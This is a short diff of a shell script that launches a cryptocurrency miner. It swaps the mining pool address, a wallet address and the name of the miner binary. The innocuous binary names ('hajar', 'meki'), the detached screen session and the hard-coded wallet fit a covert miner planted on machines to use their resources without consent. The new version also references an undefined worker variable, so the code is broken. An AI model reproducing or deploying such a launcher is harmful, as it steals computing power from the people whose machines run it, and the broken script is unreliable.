@@ -1,9 +1,7 @@
-POOL=208.113.200.73:443
+POOL=eu.luckpool.net:3956
 
-WALLET=THISPC
+WALLET=RR6U3T7Uz475i7gontznFLWikFsQan2wjC
 
-WORKER=$(echo $(shuf -i 1-10000 -n 1))
+chmod +x meki
 
-chmod +x hajar
-
-screen -dmS run ./hajar --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0 -t 4
+./meki -v -l $POOL -u $WORKER.A001 -p x -t 2
